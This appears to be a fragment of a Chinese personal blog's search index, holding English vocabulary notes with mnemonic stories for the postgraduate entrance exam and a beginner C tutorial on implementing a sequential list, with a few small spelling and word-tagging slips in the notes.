plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1、appliancen.（家用）电器，器具；</span><br><span class="line">2、applicableadj.适用的，可实施的；</span><br><span class="line">3、applicationn.用途，运用，应用；申请；勤奋；涂抹；申请表；应用程序；</span><br><span class="line">4、appointv.任命，委派；安排；</span><br><span class="line">5、appointtmentn.委任；约会；预约；职务；</span><br><span class="line">6、applyv.应用；申请，请求；适合；手压，脚踩；涂；与oneself连用，努力；</span><br><span class="line">7、appreciatev.领会；感激，感谢；欣赏，重视；升值，增值；</span><br><span class="line">8、discriminatev.歧视；区分，辨别</span><br><span class="line">9、discussv.讨论，商量；阐述；</span><br><span class="line">10、diseasen.病，疾病；弊端，恶疾；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小张是一家电器公司的销售员，他每天都要向客户介绍各种不同的家用（appliance）电器，如电视、洗衣机、冰箱等。他知道每种电器都有不同的用途和适用（applicable）范围，因此在向客户介绍时，他总是会先询问客户的需求，然后再根据客户的需求来介绍适用的电器。</span><br><span class="line">今天，小张接到一个客户的电话（appointment），客户说他需要购买一台能够自动做饭的电饭煲。小张向客户解释了目前市面上还没有这种电器，但是他可以介绍一款智能电饭煲，只需要输入时间和份量，电饭煲就可以自动完成烹饪任务。客户很满意，于是约好了下午去店里看看，小张就在店里等候着。</span><br><span class="line">下午客户到了店里，小张向他介绍了这款智能电饭煲的详细使用方法和优点（appreciate），客户很满意，于是决定购买。小张帮客户填好了购买申请（application）表格，然后在公司系统上安排了客户的订单，并将订单提交给仓库进行发货安排。</span><br><span class="line">公司一直秉持着平等、公正的原则，从不（discriminate）区别对待任何客户。在公司内部，小张和同事们也会经常（discuss）公司的发展方向和如何提升客户满意度。他们都深知只有不断进步，才能保持竞争力，才能不被市场所淘汰。</span><br><span class="line">虽然小张工作很忙，但他非常爱岗敬业，从不（appoint）拖延任务。他认为只有在工作中精益求精、勤奋努力，才能取得更好的成绩和职业（appointment）发展。他相信只要每个人都用心去做，那么公司一定会更加繁荣发展，也能给客户带来更好的产品和服务，让客户远离（disease）种种烦恼。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 英语考研单词联想记忆笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>英语考研单词联想记忆笔记-001</title>
      <link href="/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-001/"/>
      <url>/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-001/</url>
      
        <content type="html"><![CDATA[<p>2023&#x2F;03&#x2F;07 <Tuesday></p><p>Group 01</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1、consolev. 安慰，安抚；n. 控制台；</span><br><span class="line">2、consistv. 由......组成；在于；</span><br><span class="line">3、consistentadj. 始终如一的；一致的，连续的；</span><br><span class="line">4、constantadj. 不断的；重复的；不变的；</span><br><span class="line">5、constituentn. 选民，选举人；成分，要素；</span><br><span class="line">6、constitutev. 构成，组成；被视为，可算作；</span><br><span class="line">7、constitutionn.宪法，章程；体质，体格；构成，结构；</span><br><span class="line">8、constrainv.约束，限制；强迫，迫使；</span><br><span class="line">9、constructv.建筑，修建；构想，构筑；编制，绘制； n.构想，观念；建筑物；</span><br><span class="line">10、distinctadj.有区别的；确切的；显著的；清晰的，清楚的；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  在一个控制台(console)上，一个人正通过编程构建一个城市。</span><br><span class="line">他不断的(constant)建造建筑物、道路和公园，由许多不同的成分和要素组成(consist)。</span><br><span class="line">他的建造始终如一(constistent)，一致而连续，因为他要构建一个美丽而坚固的城市。</span><br><span class="line">然而，这个程序员面临着许多限制和约束(constrain)。</span><br><span class="line">他必须按照城市的宪法(constitution)和章程来建造(construct)，并考虑选民和选举人(constituent)的需求和意见。</span><br><span class="line">他必须确保城市不断发展，不断变化，但也要保持一定的稳定性和不变性。</span><br><span class="line">最终，这个程序员完成了他的任务，构建了一个清晰、有区别(distinct)和显著的城市。</span><br><span class="line">他得到了人们的称赞和赞扬，因为他的构思和观念得以实现，并创造了一个令人惊叹的建筑物。</span><br></pre></td></tr></table></figure><p>Group 02</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、distinctionn.分别，差别；卓越，杰出；优，优等；特质，特点；</span><br><span class="line">2、distinguishv.区分，辨别；使有别于；使突出；看出，听出；</span><br><span class="line">3、fruitfuladj.有成果的，有成效的；丰产的、富饶的；</span><br><span class="line">4、frustratev.使灰心，使愤怒；挫败，阻挠；</span><br><span class="line">5、fulfilv.履行，执行；实现，达到；满足，使满意；</span><br><span class="line">6、functionn.作用，功能，职能；函数；社交聚会； v.起作用；正常工作，运转；</span><br><span class="line">7、fundv.资助，为......提供资金； n.基金，专款；大量，许多；</span><br><span class="line">8、fundamentaladj.根本的，基础的，基本的； n.基本规律，根本法则；</span><br><span class="line">9、evidencen.证据，证明；v.证明，显示；</span><br><span class="line">10、evidentadj.明显的，显然的；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  在一个果园里，有两个农民在采摘水果。他们对于区分(distinguish)不同种类的水果有很高的能力。</span><br><span class="line">其中一个农民有特别突出的能力，能够轻易地区分出不同的水果，甚至能够分辨出同种水果的特质(distinction)和特点。</span><br><span class="line">因为他有这种能力，他能够让果园变得更加丰产(fruitful)、富饶，他的努力也让果实更加成熟、甜美。</span><br><span class="line">他的成果显而易见，让人们看到了他的杰出表现。</span><br><span class="line">然而，这个农民并不总是如此顺利。有时候他会被一些挫败感和灰心(frustrate)情绪所困扰，因为果园里面的水果并不总是那么完美和充足。</span><br><span class="line">他必须努力履行(fulfil)自己的职责，达到果园所期望的目标，使果园不断发展，而不是因为困难而停滞不前。</span><br><span class="line">因此，这个农民需要经常满足果园的需求，并确保果园的正常运转和有效发挥其作用(function)。</span><br><span class="line">他需要不断筹集资金(fund)，以保证果园的发展和成功。他也需要理解果园的基本规律(fundamental)和根本法则，以使果园的管理更加高效和优秀。</span><br><span class="line">最后，这个农民的努力得到了证明(evidence)和显示。果园显然是一个明显、显而易见的(evident)成功，它的成果和收益证明了他们的努力和智慧。</span><br></pre></td></tr></table></figure><p>Group 03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、evil   n.邪恶，罪恶；灾难；恶行； adj.邪恶的,罪恶的；恶魔的；令人不舒服的；</span><br><span class="line">2、environment    n.环境；运行环境；</span><br><span class="line">3、enterprise   n.公司，企业；事业；创业；进取心；</span><br><span class="line">4、entertain    v.使快乐；招待；心存；持有；</span><br><span class="line">5、entertainment    n.娱乐活动，文娱节目；娱乐；招待；</span><br><span class="line">6、monopoly   n.垄断，专卖，独占；</span><br><span class="line">7、monotonous   adj.单调乏味的；</span><br><span class="line">8、mood   n.心情，情绪；气氛；语气；</span><br><span class="line">9、transmission   n.传播；播送；节目；变速器；</span><br><span class="line">10、transmit    v.传输，发送；传播，传染；传导；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  从前有一个（enterprise）企业家，他经营着一家大型公司。</span><br><span class="line">他十分（envy）羡慕着其他竞争对手公司的（monopoly）垄断地位和（entertainment）娱乐活动的种类，因此他决定从事这一业务。</span><br><span class="line">他开始投资并（entertain）招待人们，提供各种新颖的文娱节目来吸引更多的客户。</span><br><span class="line">但很快，这位企业家发现自己的（monotonous）单调乏味的娱乐活动并不能吸引更多的客户，他的公司逐渐走向了破产的边缘。</span><br><span class="line">为了挽救这个局面，他开始研究市场需求，推出更多的（entertainment）娱乐项目，以此来扩大自己的（transmission）传播范围。</span><br><span class="line">最终，这个企业家在不断尝试和努力之后，终于开发出了多种受欢迎的（entertainment）娱乐活动，使得他的公司实现了翻天覆地的变化。</span><br><span class="line">这种转变不仅让他的公司成功了，也改变了人们的（mood）心情和生活，成为城市里最有影响力的企业之一。</span><br></pre></td></tr></table></figure><p>Group 04</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、transplantv.移植；使迁移；移栽； n.移植；移植器官；</span><br><span class="line">2、transportn.交通工具，运输工具；运送；运输业，交通； v.运输，运送；</span><br><span class="line">3、stockn.股票；库存；储备；股东；债券；出身；家畜；高汤； v.存有 adj.老一套的；常备的；</span><br><span class="line">4、storen.商店；储备；仓库； v.储备；存储；记忆；</span><br><span class="line">5、storagen.储藏，存储；</span><br><span class="line">6、stridev.大步走 n.大步；进展，进步；</span><br><span class="line">7、strikev.击打；突然想到；罢工；让......觉得； n.撞击；罢工，罢课；发现；袭击；</span><br><span class="line">8、strikingadj.引人注目的，显著的；漂亮的； v.撞，罢工（strike的现在分词）；</span><br><span class="line">9、stringn.一串；一系列；字符串；线；细绳（乐器的）弦； v.串，系；给......装弦； adj.弦乐的；</span><br><span class="line">10、structuren.体系；结构；结构体；建筑物； v.系统安排；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小薇是一位植物学家，她想要在自己的实验室里进行一项关于植物的研究。</span><br><span class="line">她需要将不同的植物从不同的地方采集到实验室中，然后进行比较和研究。</span><br><span class="line">她使用了不同的（transport）方式，有些是通过货车（truck）运输，有些是通过航空运输（air transport）。</span><br><span class="line">在实验室中，小薇将这些植物进行了种植，并在不同的时间和环境下进行了（transplant）移植，以研究它们在不同的环境下的生长和发展。</span><br><span class="line">他将这些植物种植在（storage）储藏室中，以确保它们有足够的养分和水分，以便在实验中能够良好地生长。在整个实验过程中，</span><br><span class="line">小薇一直在对这些植物的生长情况进行观察，并记录着这些数据。</span><br><span class="line">通过对这些数据的分析，小薇发现了这些植物的生长方式和生长条件有很大的（variation）变化，这使得她能够获得更多的有关植物的信息和知识，</span><br><span class="line">这些知识可以帮助她在将来的研究中取得更好的进展。（structure）实验的结果表明，</span><br><span class="line">植物生长的过程和它们生长的环境密切相关，这也启发小薇更加深入地研究植物和它们的生态环境。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 英语考研单词联想记忆笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线性结构-实现顺序表的数据存储、初始化、插入、获取元素、遍历</title>
      <link href="/2023/03/14/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84-%E5%AE%9E%E7%8E%B0%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E3%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E3%80%81%E6%8F%92%E5%85%A5%E3%80%81%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0%E3%80%81%E9%81%8D%E5%8E%86/"/>
      <url>/2023/03/14/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84-%E5%AE%9E%E7%8E%B0%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E3%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E3%80%81%E6%8F%92%E5%85%A5%E3%80%81%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0%E3%80%81%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>课堂上老师实现的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data[MAXSIZE];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SQList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SQList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SQList *L, <span class="type">int</span> i, <span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">if</span>( i &lt; <span class="number">1</span> || i &gt; L-&gt;length +<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error:insert index error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( L-&gt;length == MAXSIZE )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error:List is full\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>( j = L-&gt;length; j &gt;= i; j-- )</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[j] = L-&gt;data[j<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>] = e;</span><br><span class="line">    L-&gt;length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElement</span><span class="params">(SQList *L, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: Get index error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Traverse</span><span class="params">(SQList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    SQList L;</span><br><span class="line">    <span class="type">int</span> i, e;</span><br><span class="line">    InitList(&amp;L);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    Traverse(&amp;L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>1、包含标准输入输出头文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>2、定义宏 MAXSIZE 为100。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100</span></span><br></pre></td></tr></table></figure><p>3、定义结构体 SQList，包含 int 类型数组 data 和 int 类型 length。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data[MAXSIZE];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SQList;</span><br></pre></td></tr></table></figure><p>4、定义函数 InitList，初始化顺序表 L 的长度为 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SQList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、定义函数 ListInsert，用于在顺序表 L 中第 i 个位置插入元素 e。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SQList *L, <span class="type">int</span> i, <span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">// 判断插入位置是否合法</span></span><br><span class="line">    <span class="keyword">if</span>( i &lt; <span class="number">1</span> || i &gt; L-&gt;length +<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error:insert index error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断顺序表是否已满</span></span><br><span class="line">    <span class="keyword">if</span> ( L-&gt;length == MAXSIZE )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error:List is full\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从后向前将元素后移</span></span><br><span class="line">    <span class="keyword">for</span>( j = L-&gt;length; j &gt;= i; j-- )</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[j] = L-&gt;data[j<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在第 i 个位置插入元素 e</span></span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>] = e;</span><br><span class="line">    L-&gt;length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6、定义函数 GetElement，获取顺序表 L 中第 i 个位置的元素。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetElement</span><span class="params">(SQList *L, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 判断获取位置是否合法</span></span><br><span class="line">    <span class="keyword">if</span> ( i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: Get index error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7、定义函数 Traverse，遍历顺序表 L 并输出每个元素。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Traverse</span><span class="params">(SQList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, L-&gt;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8、主函数中定义顺序表 L，并对其进行初始化。调用 ListInsert 函数向 L 中插入 4 个元素，再调用 Traverse 函数输出顺序表中所有元素。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    SQList L;</span><br><span class="line">    <span class="type">int</span> i, e;</span><br><span class="line">    InitList(&amp;L);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">    ListInsert(&amp;L,<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    Traverse(&amp;L);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：<br><img src="https://s2.loli.net/2023/03/06/ZP2TeEUoy68XIWa.png" alt="image-20230228172828013.png" style="zoom:50%;float: left;" /></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该代码实现了顺序表的基本操作，包括初始化顺序表、向顺序表中插入元素、获取顺序表中的元素和遍历顺序表。使用宏定义了线性表的最大长度。通过这些操作可以方便地对线性表进行操作，进行元素的增删改查。主函数中演示了如何使用这些操作来创建顺序表并对其进行操作。新手可以通过理解该代码来学习线性结构中顺序表的基本操作，包括初始化、插入、获取元素和遍历等。</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q1：要学习数据结构前需要什么前置知识？<br>A1：要有编程语言为基础，这里推荐C&#x2F;C++最为和合适，其他Java、Go、C#、Rust等编程语言也可以。数据结构一般与算法关联，重要的是实现思路，任何编程语言都可以实现。其中，在数据结构和算法中大部分都会使用到编程中指针、结构体、各种循环、各种判断语句等等，所以在学习数据结构与算法前编程语言功底是很有必要的。</p><p>Q2：C语言和数据结构有什么学习教程推荐吗？<br>A2：可以通过阅读相关书籍 or 视频教程去针对性学习<br>书籍推荐如下：</p><ul><li>《C Primer Plus（第6版）》 - Stephen Prata著<br>该书是一本非常受欢迎的C语言入门教材。它以易于理解的方式介绍了C语言的基本概念，从简单的程序开始，循序渐进地深入探讨C语言的各个方面。该书还包括许多示例代码和练习题，这些都可以帮助读者快速掌握C语言的编程技能。</li><li>《数据结构与算法分析（C语言描述）》 - Mark Allen Weiss著<br>该书介绍了数据结构和算法的基本原理，并使用C语言进行描述和实现。该书提供了大量的示例代码和练习题，涵盖了众多常见的数据结构和算法，如数组、栈、队列、链表、树、散列表等等。该书内容全面，适合初学者和有一定经验的程序员学习。</li></ul><p>视频教程推荐如下：</p><ul><li>C语言程序设计（CLion版-2022）：<br><a href="https://www.bilibili.com/video/BV1Cr4y137os?p=1&vd_source=df047e552d8052bb5bf4941af8d64c97">https://www.bilibili.com/video/BV1Cr4y137os?p=1&amp;vd_source=df047e552d8052bb5bf4941af8d64c97</a></li><li>数据结构与算法（CLion版-2022）：<br><a href="https://www.bilibili.com/video/BV13W4y127Ey/?spm_id_from=333.337.top_right_bar_window_history.content.click&vd_source=df047e552d8052bb5bf4941af8d64c97">https://www.bilibili.com/video/BV13W4y127Ey/?spm_id_from=333.337.top_right_bar_window_history.content.click&amp;vd_source=df047e552d8052bb5bf4941af8d64c97</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>依然相信所相信的一切</title>
      <link href="/2023/03/14/%E7%90%86%E6%83%B3%E7%94%9F%E6%B4%BB/"/>
      <url>/2023/03/14/%E7%90%86%E6%83%B3%E7%94%9F%E6%B4%BB/</url>
      
